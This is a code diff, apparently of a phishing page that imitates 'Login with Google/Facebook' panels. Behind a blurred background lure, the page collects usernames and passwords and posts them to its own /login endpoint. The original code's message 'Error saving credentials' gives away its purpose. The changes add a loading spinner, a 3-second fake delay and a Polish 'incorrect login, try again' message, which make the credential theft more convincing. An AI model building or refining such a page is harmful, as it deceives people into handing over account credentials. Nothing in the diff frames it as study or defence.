@@ -117,6 +117,34 @@
         .login-panel button:hover {
             background-color: #357ae8;
         }
+
+        /* Kółko ładowania */
+        .loader {
+            display: none;
+            border: 8px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 8px solid #3498db;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1000;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Styl wiadomości o błędzie */
+        .error-message {
+            color: red;
+            margin-top: 20px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -135,7 +163,7 @@
             Sign up with Google
         </a>
 
-        <!-- Hidden Login Panel -->
+        <!-- Panel logowania -->
         <div id="loginPanel" class="login-panel">
             <h3 id="loginTitle">Login</h3>
             <form id="loginForm" method="POST">
@@ -144,8 +172,12 @@
                 <input type="hidden" id="provider" name="provider">
                 <button type="submit">Login</button>
             </form>
+            <p id="errorMessage" class="error-message">Niepoprawne dane logowanie. Spróbuj ponownie!</p>
         </div>
     </div>
+
+    <!-- Kółko ładowania -->
+    <div class="loader" id="loadingSpinner"></div>
 
     <script>
         function showLoginPanel(platform) {
@@ -155,11 +187,11 @@
             const facebookBtn = document.getElementById('facebookBtn');
             const googleBtn = document.getElementById('googleBtn');
 
-            // Hide the buttons
+            // Ukryj przyciski
             facebookBtn.style.display = 'none';
             googleBtn.style.display = 'none';
 
-            // Show the login panel
+            // Pokaż panel logowania
             loginPanel.style.display = 'block';
             loginTitle.textContent = `Login with ${platform}`;
             providerInput.value = platform;
@@ -167,23 +199,35 @@
 
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
+
+            // Ukryj wiadomość o błędzie, jeśli była wcześniej wyświetlona
+            document.getElementById('errorMessage').style.display = 'none';
+
+            // Pokaż kółko ładowania
+            document.getElementById('loadingSpinner').style.display = 'block';
+
             const formData = new FormData(event.target);
             fetch('/login', {
                 method: 'POST',
                 body: formData
-            }).then(response => response.json())
-              .then(data => {
-                  if (data.status === 'success') {
-                      // Remove blur filter from the image background
-                      document.querySelector('.background-container img').style.filter = 'none';
-                      document.querySelector('.background-container img').style.pointerEvents = 'auto';
+            }).then(response => {
+                return response.json();
+            }).then(data => {
+                // Poczekaj 3 sekundy przed ukryciem kółka ładowania
+                setTimeout(() => {
+                    document.getElementById('loadingSpinner').style.display = 'none';
 
-                      // Hide the sign-in container
-                      document.getElementById('signinContainer').style.display = 'none';
-                  } else {
-                      alert('Error saving credentials.');
-                  }
-              });
+                    if (data.status === 'success') {
+                        // Usuń filtr rozmycia z tła i ukryj panel logowania
+                        document.querySelector('.background-container img').style.filter = 'none';
+                        document.querySelector('.background-container img').style.pointerEvents = 'auto';
+                        document.getElementById('signinContainer').style.display = 'none';
+                    } else {
+                        // Pokaż wiadomość o błędzie
+                        document.getElementById('errorMessage').style.display = 'block';
+                    }
+                }, 3000); // Opóźnienie 3 sekundy
+            });
         });
     </script>
 </body>
